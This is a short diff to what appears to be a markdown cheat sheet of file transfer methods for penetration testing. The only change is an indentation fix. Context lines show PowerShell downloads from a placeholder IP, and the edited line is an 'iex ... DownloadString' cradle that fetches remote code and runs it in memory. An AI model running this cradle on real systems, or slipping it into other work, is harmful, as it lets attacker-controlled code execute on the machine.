@@ -76,7 +76,7 @@ Invoke-WebRequest -Uri http://<IP>/file -OutFile file
 [IO.File]::WriteAllBytes("file", [Convert]::FromBase64String((Get-Content file.b64)))
 
 # Basic download string
-	iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
+iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
 ```
 
 ### 7. TFTP (UDP)
